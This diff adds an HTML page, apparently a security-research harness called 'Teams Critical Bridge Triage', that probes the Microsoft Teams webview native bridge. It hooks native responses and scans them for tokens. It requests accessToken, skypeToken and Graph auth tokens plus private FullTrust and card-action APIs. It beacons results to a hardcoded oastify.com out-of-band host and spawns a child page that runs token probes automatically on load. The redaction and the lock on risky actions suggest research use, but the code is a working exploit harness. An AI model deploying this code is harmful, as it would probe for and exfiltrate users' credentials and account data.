@@ -1,0 +1,471 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Teams Critical Bridge Triage</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; background: #0b0f14; color: #d6dde6; font: 12px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  header { position: sticky; top: 0; z-index: 2; background: #101720; border-bottom: 1px solid #2d3744; padding: 8px; }
+  h1 { margin: 0 0 6px; font-size: 15px; }
+  main { padding: 8px; }
+  section { border: 1px solid #2d3744; background: #151b23; border-radius: 6px; padding: 8px; margin-bottom: 8px; }
+  h2 { margin: 0 0 6px; font-size: 12px; color: #58a6ff; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(155px, 1fr)); gap: 5px; }
+  .settings { display: grid; grid-template-columns: 92px 1fr; gap: 5px; align-items: center; margin-top: 6px; }
+  input { width: 100%; min-width: 0; background: #080c10; color: #d6dde6; border: 1px solid #2d3744; border-radius: 4px; padding: 5px; font: inherit; }
+  label { color: #8b98a7; }
+  button { min-height: 34px; text-align: left; background: #1c2430; color: #d6dde6; border: 1px solid #2d3744; border-radius: 4px; padding: 6px; font: inherit; }
+  button.safe { color: #3fb950; border-color: #3fb950; }
+  button.warn { color: #d29922; border-color: #d29922; }
+  button.hot { color: #f0883e; border-color: #f0883e; }
+  button.danger { color: #f85149; border-color: #f85149; }
+  .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; margin-top: 6px; }
+  #out { white-space: pre-wrap; word-break: break-word; min-height: 300px; max-height: 58vh; overflow: auto; background: #080c10; border: 1px solid #2d3744; border-radius: 6px; padding: 8px; }
+  .ok { color: #3fb950; } .warnText { color: #d29922; } .bad { color: #f85149; } .info { color: #58a6ff; } .hotText { color: #f0883e; }
+</style>
+</head>
+<body>
+<header>
+  <h1>Teams Critical Bridge Triage</h1>
+  <div class="grid">
+    <button class="safe" onclick="baseline()">Baseline</button>
+    <button class="hot" onclick="runSafeCriticalBatch()">Run safe critical batch</button>
+    <button onclick="copyLog()">Copy log</button>
+    <button onclick="clearLog()">Clear</button>
+  </div>
+  <div class="settings">
+    <label>OAST</label>
+    <input id="oast" value="s924iasmarwrhw7lpwncu9m7lyrpfh36.oastify.com">
+    <label>Base URL</label>
+    <input id="base" value="">
+  </div>
+  <div class="row">
+    <label><input id="rawPreview" type="checkbox"> send redacted previews to OAST</label>
+    <label><input id="allowRisky" type="checkbox"> unlock risky/manual actions</label>
+  </div>
+</header>
+
+<main id="main">
+  <section>
+    <h2>1. Identity / Token / Config Probes</h2>
+    <div class="grid">
+      <button class="safe" onclick="probeIdentity()">Identity read probes</button>
+      <button class="safe" onclick="probeConfigTokens()">Config token-key probes</button>
+      <button class="safe" onclick="probeAuthTokens()">Auth token probes</button>
+      <button class="safe" onclick="probeFullTrust()">FullTrust probes</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>2. Task Module Bridge Propagation</h2>
+    <div class="grid">
+      <button class="hot" onclick="openTaskChild()">Open task child self-test</button>
+      <button class="safe" onclick="openTaskChildNoUi()">Open task child silent probe</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>3. Listener Object Tests</h2>
+    <div class="grid">
+      <button class="safe" onclick="probeListener()">Probe listener</button>
+      <button class="warn" onclick="listenerObjectSetup()">listener object setup</button>
+      <button class="warn" onclick="listenerObjectGetContext()">listener object getContext</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>4. Authenticated Action / UI Flow Probes</h2>
+    <div class="grid">
+      <button class="safe" onclick="safeDeepLinks()">Safe deep link probes</button>
+      <button class="safe" onclick="probeShareAndStore()">Share/store UI probes</button>
+      <button class="safe" onclick="probeConversationsRead()">Conversation read probes</button>
+      <button class="warn" onclick="probePrivateActions()">Private action probes</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>5. Manual Risky Actions</h2>
+    <div class="grid">
+      <button class="danger" onclick="uploadCustomAppProbe()">uploadCustomApp benign manifest</button>
+      <button class="danger" onclick="permissionRequestProbe()">permissions.request(media)</button>
+      <button class="danger" onclick="authAuthenticateCrashRepro()">authentication.authenticate crash repro</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>Output</h2>
+    <div id="out"></div>
+  </section>
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  var out = document.getElementById('out');
+  var NI = window.nativeInterface || null;
+  var msgId = 73000;
+  var records = [];
+  var originalHandle = NI && NI.handleResponseFromNative;
+  var mode = new URL(location.href).searchParams.get('mode') || 'main';
+  var label = new URL(location.href).searchParams.get('label') || mode;
+
+  function currentDir() {
+    return location.href.split('#')[0].split('?')[0].replace(/\/[^\/]*$/, '');
+  }
+  document.getElementById('base').value = currentDir();
+
+  function log(level, msg, data) {
+    var cls = level === 'ok' ? 'ok' : level === 'bad' ? 'bad' : level === 'hot' ? 'hotText' : level === 'warn' ? 'warnText' : 'info';
+    var line = '[' + new Date().toISOString() + '] [' + level.toUpperCase() + '] ' + msg;
+    var div = document.createElement('div');
+    div.className = cls;
+    div.textContent = line + (data === undefined ? '' : ' ' + safe(data, 2));
+    out.appendChild(div);
+    out.scrollTop = out.scrollHeight;
+    records.push({ ts: new Date().toISOString(), level: level, msg: msg, data: data });
+  }
+
+  function safe(v, d) {
+    if (d === undefined) d = 2;
+    if (d < 0) return '[depth]';
+    if (v === null) return 'null';
+    if (v === undefined) return 'undefined';
+    var t = typeof v;
+    if (t === 'string') return '"' + redact(v).slice(0, 450) + '"';
+    if (t === 'number' || t === 'boolean') return String(v);
+    if (t === 'function') return '[fn ' + (v.name || 'anonymous') + ']';
+    if (Array.isArray(v)) return '[' + v.slice(0, 14).map(function (x) { return safe(x, d - 1); }).join(', ') + ']';
+    if (t === 'object') {
+      var keys;
+      try { keys = Object.getOwnPropertyNames(v); } catch (e) { keys = Object.keys(v); }
+      return '{' + keys.slice(0, 28).map(function (k) {
+        try { return k + ':' + safe(v[k], d - 1); } catch (e) { return k + ':[err]'; }
+      }).join(', ') + '}';
+    }
+    return String(v);
+  }
+
+  function redact(s) {
+    return String(s)
+      .replace(/eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, '[JWT]')
+      .replace(/Bearer\s+[A-Za-z0-9._~+/=-]{20,}/gi, 'Bearer [REDACTED]')
+      .replace(/access_token[=:][^&\s"]+/gi, 'access_token=[REDACTED]')
+      .replace(/refresh_token[=:][^&\s"]+/gi, 'refresh_token=[REDACTED]');
+  }
+
+  function oast() { return document.getElementById('oast').value.trim(); }
+  function base() { return document.getElementById('base').value.replace(/\/$/, ''); }
+  function ex(path, data) {
+    var host = oast();
+    if (!host) return;
+    data = data || {};
+    data.ts = Date.now();
+    var qs = Object.keys(data).map(function (k) {
+      return encodeURIComponent(k) + '=' + encodeURIComponent(String(data[k]).slice(0, 900));
+    }).join('&');
+    var url = 'https://' + host + '/' + path + '?' + qs;
+    fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(function () { (new Image()).src = url; });
+  }
+
+  function b64decodeMaybe(s) {
+    if (typeof s !== 'string' || s.length < 8) return '';
+    try {
+      var d = atob(s);
+      if (/^[\x09\x0a\x0d\x20-\x7e]+$/.test(d.slice(0, 200))) return d;
+    } catch (e) {}
+    return '';
+  }
+
+  function keywordSummary(text) {
+    text = String(text || '');
+    var lower = text.toLowerCase();
+    var keys = ['token', 'authtoken', 'access_token', 'accesstoken', 'aadtoken', 'skypetoken', 'bearer', 'refresh_token', 'sso', 'password', 'secret'];
+    var hit = keys.filter(function (k) { return lower.indexOf(k) !== -1; });
+    var jwt = /eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/.test(text);
+    return { tokenLike: hit.length > 0 || jwt, keywords: hit.join(','), jwtLike: jwt, length: text.length };
+  }
+
+  async function sha256(text) {
+    try {
+      var data = new TextEncoder().encode(String(text || ''));
+      var hash = await crypto.subtle.digest('SHA-256', data);
+      return Array.from(new Uint8Array(hash)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
+    } catch (e) {
+      return '';
+    }
+  }
+
+  async function analyzeResponse(source, args) {
+    var raw0 = String(args[0] || '');
+    var decoded = b64decodeMaybe(raw0);
+    var combined = raw0 + '\n' + decoded;
+    var summary = keywordSummary(combined);
+    var h = summary.tokenLike ? await sha256(combined) : '';
+    var preview = document.getElementById('rawPreview') && document.getElementById('rawPreview').checked ? redact(decoded || raw0).slice(0, 650) : '';
+    var info = {
+      source: source,
+      argCount: args.length,
+      id: String(args[1] || ''),
+      tokenLike: summary.tokenLike,
+      keywords: summary.keywords,
+      jwtLike: summary.jwtLike,
+      responseLength: summary.length,
+      hash: h.slice(0, 16),
+      preview: preview
+    };
+    log(summary.tokenLike ? 'hot' : 'info', 'bridge response analyzed', info);
+    ex('t23/response', info);
+  }
+
+  if (NI && typeof originalHandle === 'function') {
+    NI.handleResponseFromNative = function () {
+      var args = Array.prototype.slice.call(arguments);
+      analyzeResponse(label, args);
+      return originalHandle.apply(this, arguments);
+    };
+  }
+
+  function request(func, args, tag) {
+    NI = window.nativeInterface || NI;
+    if (!NI || !NI.framelessPostMessage) {
+      log('bad', 'nativeInterface.framelessPostMessage missing');
+      ex('t23/send-error', { label: label, func: func, err: 'missing NI' });
+      return null;
+    }
+    var req = {
+      id: msgId++,
+      func: func,
+      args: args || [],
+      timestamp: Date.now(),
+      apiVersionTag: 'v2_' + String(func).replace(/[^a-zA-Z0-9_.-]/g, '_')
+    };
+    try {
+      NI.framelessPostMessage(JSON.stringify(req));
+      log('info', 'sent ' + func, { id: req.id, tag: tag || '', args: args });
+      ex('t23/send', { label: label, id: req.id, func: func, tag: tag || '', arg0: args && args[0] ? safe(args[0], 1) : '' });
+      return req.id;
+    } catch (e) {
+      log('bad', 'send failed ' + func, e.message);
+      ex('t23/send-error', { label: label, func: func, err: e.message });
+      return null;
+    }
+  }
+
+  function delayed(list, gap) {
+    gap = gap || 650;
+    list.forEach(function (fn, i) { setTimeout(fn, i * gap); });
+  }
+
+  window.baseline = function () {
+    var props = window.nativeInterface ? Object.getOwnPropertyNames(window.nativeInterface) : [];
+    var handlers = window.nativeInterface && window.nativeInterface.handlers ? Object.keys(window.nativeInterface.handlers) : [];
+    var data = {
+      label: label,
+      mode: mode,
+      href: location.href,
+      origin: location.origin,
+      ua: navigator.userAgent,
+      topSelf: top === self,
+      parentSelf: parent === self,
+      hasNI: !!window.nativeInterface,
+      niProps: props.length,
+      hasWebkit: !!window.webkit,
+      hasTeams: !!window.microsoftTeams,
+      handlers: handlers.join(',')
+    };
+    log('ok', 'baseline', data);
+    ex('t23/baseline', data);
+  };
+
+  window.probeIdentity = function () {
+    delayed([
+      function () { request('getContext', [], 'identity'); },
+      function () { request('getUserInfo', [], 'identity'); },
+      function () { request('getUserJoinedTeams', [], 'identity'); },
+      function () { request('getChatMembers', [], 'identity'); },
+      function () { request('conversations.getChatMembers', [], 'identity'); }
+    ]);
+  };
+
+  window.probeConfigTokens = function () {
+    var keys = ['accessToken', 'skypeToken', 'aadToken', 'authToken', 'ssoToken', 'userObjectId', 'tenantId', 'ring', 'environment'];
+    delayed(keys.map(function (k) {
+      return function () { request('getConfigSetting', [k], 'config-' + k); };
+    }), 500);
+  };
+
+  window.probeAuthTokens = function () {
+    delayed([
+      function () { request('authentication.getAuthToken', [{}], 'auth-empty'); },
+      function () { request('authentication.getAuthToken', [{ resources: ['https://graph.microsoft.com'] }], 'auth-graph-resources'); },
+      function () { request('authentication.getAuthToken', [{ resource: 'https://graph.microsoft.com' }], 'auth-graph-resource'); },
+      function () { request('nestedAppAuth.execute', [{ messageType: 'NestedAppAuth', requestId: 't23-' + Date.now() }], 'nested-auth'); }
+    ], 900);
+  };
+
+  window.probeFullTrust = function () {
+    delayed([
+      function () { request('teams.fullTrust.getConfigSetting', ['accessToken'], 'fulltrust-accessToken'); },
+      function () { request('teams.fullTrust.getConfigSetting', ['skypeToken'], 'fulltrust-skypeToken'); },
+      function () { request('teams.fullTrust.getUserJoinedTeams', [], 'fulltrust-joinedTeams'); },
+      function () { request('getUserJoinedTeams', [], 'legacy-joinedTeams'); }
+    ], 750);
+  };
+
+  window.openTaskChild = function () {
+    var url = base() + '/test23.html?mode=child&label=task-child&oast=' + encodeURIComponent(oast());
+    request('tasks.startTask', [{ url: url, title: 'Bridge child self-test', width: 640, height: 640 }], 'task-child');
+  };
+
+  window.openTaskChildNoUi = function () {
+    var url = base() + '/test23.html?mode=child&label=task-silent&oast=' + encodeURIComponent(oast());
+    request('tasks.startTask', [{ url: url, title: 'Bridge child probe', height: 'small', width: 'small' }], 'task-silent');
+  };
+
+  window.probeListener = function () {
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    var data = { exists: !!listener, type: typeof listener, hasPostMessage: !!(listener && listener.postMessage), postMessageType: listener && typeof listener.postMessage };
+    log(data.exists ? 'ok' : 'warn', 'listener probe', data);
+    ex('t23/listener-probe', data);
+  };
+
+  function listenerPostObject(payload, name) {
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    if (!listener || !listener.postMessage) return log('bad', 'listener missing');
+    try {
+      var ret = listener.postMessage(payload);
+      log('warn', 'listener object returned ' + name, ret);
+      ex('t23/listener-object', { name: name, ok: true, ret: safe(ret, 1) });
+    } catch (e) {
+      log('bad', 'listener object threw ' + name, e.message);
+      ex('t23/listener-object', { name: name, ok: false, err: e.message });
+    }
+  }
+
+  window.listenerObjectSetup = function () {
+    listenerPostObject({ bridge: 'setup', source: 't23', ts: Date.now() }, 'setup');
+  };
+
+  window.listenerObjectGetContext = function () {
+    listenerPostObject({ id: msgId++, func: 'getContext', args: [], timestamp: Date.now(), apiVersionTag: 'v2_getContext' }, 'getContext');
+  };
+
+  window.safeDeepLinks = function () {
+    var host = oast();
+    delayed([
+      function () { request('executeDeepLink', ['https://' + host + '/t23-deeplink-external?ts=' + Date.now()], 'deeplink-external'); },
+      function () { request('executeDeepLink', ['https://teams.microsoft.com/l/chat/0/0'], 'deeplink-chat-ui'); },
+      function () { request('executeDeepLink', ['https://teams.microsoft.com/l/app/00000000-0000-0000-0000-000000000000'], 'deeplink-install-ui-invalid'); }
+    ], 1200);
+  };
+
+  window.probeShareAndStore = function () {
+    delayed([
+      function () { request('sharing.shareWebContent', [{ content: [{ type: 'URL', url: 'https://' + oast() + '/t23-share-url', message: 'T23 share probe' }] }], 'share-web-content'); },
+      function () { request('store.openFullStore', [{}], 'store-open-full'); },
+      function () { request('store.openAppDetail', [{ appId: '00000000-0000-0000-0000-000000000000' }], 'store-app-detail-invalid'); }
+    ], 1000);
+  };
+
+  window.probeConversationsRead = function () {
+    delayed([
+      function () { request('conversations.getChatMembers', [], 'conv-members'); },
+      function () { request('getChatMembers', [], 'legacy-chat-members'); },
+      function () { request('conversations.openConversation', [{ subEntityId: 't23', title: 'T23 probe' }], 'conv-open-ui'); },
+      function () { request('conversations.closeConversation', [], 'conv-close'); }
+    ], 800);
+  };
+
+  window.probePrivateActions = function () {
+    delayed([
+      function () { request('externalAppCardActions.processActionOpenUrl', ['00000000-0000-0000-0000-000000000000', { url: 'https://' + oast() + '/t23-card-open-url' }], 'card-open-url'); },
+      function () { request('externalAppCommands.processActionCommand', ['00000000-0000-0000-0000-000000000000', { commandId: 't23', data: {} }], 'external-command'); },
+      function () { request('appEntity.selectAppEntity', [{ appId: '00000000-0000-0000-0000-000000000000', entityId: 't23' }], 'app-entity'); }
+    ], 900);
+  };
+
+  function riskyAllowed(name) {
+    if (!document.getElementById('allowRisky').checked) {
+      log('warn', name + ' blocked: mark unlock risky/manual actions first');
+      return false;
+    }
+    return true;
+  }
+
+  window.uploadCustomAppProbe = function () {
+    if (!riskyAllowed('uploadCustomApp')) return;
+    var manifest = {
+      '$schema': 'https://developer.microsoft.com/json-schemas/teams/v1.16/MicrosoftTeams.schema.json',
+      manifestVersion: '1.16',
+      version: '1.0.0',
+      id: '00000000-0000-0000-0000-000000000000',
+      packageName: 'com.example.t23.invalid',
+      developer: { name: 'T23 Test', websiteUrl: 'https://' + oast(), privacyUrl: 'https://' + oast() + '/privacy', termsOfUseUrl: 'https://' + oast() + '/terms' },
+      name: { short: 'T23 Invalid' },
+      description: { short: 'T23 invalid manifest', full: 'T23 invalid manifest' },
+      icons: { outline: 'outline.png', color: 'color.png' },
+      accentColor: '#FFFFFF',
+      staticTabs: []
+    };
+    request('uploadCustomApp', [JSON.stringify(manifest)], 'upload-invalid-manifest');
+  };
+
+  window.permissionRequestProbe = function () {
+    if (!riskyAllowed('permissions.request')) return;
+    request('permissions.request', ['media'], 'permissions-request-media');
+  };
+
+  window.authAuthenticateCrashRepro = function () {
+    if (!riskyAllowed('authentication.authenticate crash repro')) return;
+    request('authentication.authenticate', [{ url: 'https://' + oast() + '/t23-auth-url?ts=' + Date.now(), width: 640, height: 640 }], 'auth-authenticate');
+  };
+
+  window.runSafeCriticalBatch = function () {
+    baseline();
+    setTimeout(probeIdentity, 500);
+    setTimeout(probeConfigTokens, 4200);
+    setTimeout(probeAuthTokens, 9000);
+    setTimeout(probeFullTrust, 12800);
+    setTimeout(openTaskChild, 16500);
+    setTimeout(probeListener, 18000);
+    setTimeout(listenerObjectSetup, 18800);
+    setTimeout(listenerObjectGetContext, 19800);
+    setTimeout(safeDeepLinks, 21200);
+    setTimeout(probeConversationsRead, 25500);
+  };
+
+  window.copyLog = function () {
+    var text = records.map(function (r) {
+      return '[' + r.ts + '] [' + r.level + '] ' + r.msg + (r.data === undefined ? '' : ' ' + safe(r.data, 3));
+    }).join('\n');
+    navigator.clipboard.writeText(text).then(function () { log('ok', 'copied'); }).catch(function (e) { log('bad', 'copy failed', e.message || e); });
+  };
+
+  window.clearLog = function () {
+    out.textContent = '';
+    records = [];
+  };
+
+  function childAutoRun() {
+    document.querySelector('h1').textContent = 'Teams Critical Bridge Triage - Child';
+    baseline();
+    setTimeout(function () { request('getContext', [], 'child-getContext'); }, 500);
+    setTimeout(function () { request('getConfigSetting', ['accessToken'], 'child-config-accessToken'); }, 1200);
+    setTimeout(function () { request('getUserJoinedTeams', [], 'child-joinedTeams'); }, 1900);
+    setTimeout(function () { request('executeDeepLink', ['https://' + oast() + '/t23-child-deeplink?ts=' + Date.now()], 'child-deeplink'); }, 2600);
+  }
+
+  var oastParam = new URL(location.href).searchParams.get('oast');
+  if (oastParam) document.getElementById('oast').value = oastParam;
+
+  baseline();
+  if (mode === 'child') {
+    childAutoRun();
+  }
+})();
+</script>
+</body>
+</html>
